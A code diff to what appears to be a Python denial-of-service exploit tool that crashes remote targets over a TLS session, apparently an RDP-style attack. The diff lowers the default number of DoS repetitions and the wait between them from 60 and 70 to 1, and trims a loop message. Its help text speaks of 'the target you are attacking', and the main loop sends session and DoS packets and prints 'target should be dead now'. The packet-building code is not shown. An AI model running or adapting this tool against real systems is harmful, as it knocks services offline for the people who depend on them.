@@ -31,12 +31,12 @@ class Parser(argparse.ArgumentParser):
             help="Pass the architecture of the target you are attacking (*default=64)"
         )
         parser.add_argument(
-            "-t", "--dos-times", type=int, dest="dosTime", metavar="AMOUNT", default=60,
-            help="Pass how many times you want to DoS the target before exiting (*default=60)"
+            "-t", "--dos-times", type=int, dest="dosTime", metavar="AMOUNT", default=1,
+            help="Pass how many times you want to DoS the target before exiting (*default=1)"
         )
         parser.add_argument(
-            "-w", "--wait-time", type=int, dest="waitTime", metavar="SECONDS", default=70,
-            help="Pass how long you want to wait in between DoS's (*default=70)"
+            "-w", "--wait-time", type=int, dest="waitTime", metavar="SECONDS", default=1,
+            help="Pass how long you want to wait in between DoS's (*default=1)"
         )
         parser.add_argument(
             "-v", "--verbose", action="store_true", default=False, dest="runVerbose",
@@ -366,9 +366,8 @@ def main():
                 send_establish_session_pdu_packet(current_tls)
                 print("[+] DoSing target: {}".format(target))
                 send_dos_packets(current_tls, opt.archSelected)
-                print("[+] target should be dead now, waiting {}s before starting again".format(opt.waitTime))
+                print("[+] target should be dead now, waiting {}s".format(opt.waitTime))
                 time.sleep(opt.waitTime)
-                print("\n[+] starting again\n")
         except Exception as e:
             print(
                 "[!] error on target: {} ({}), if this happened after a successful attack, change the wait "
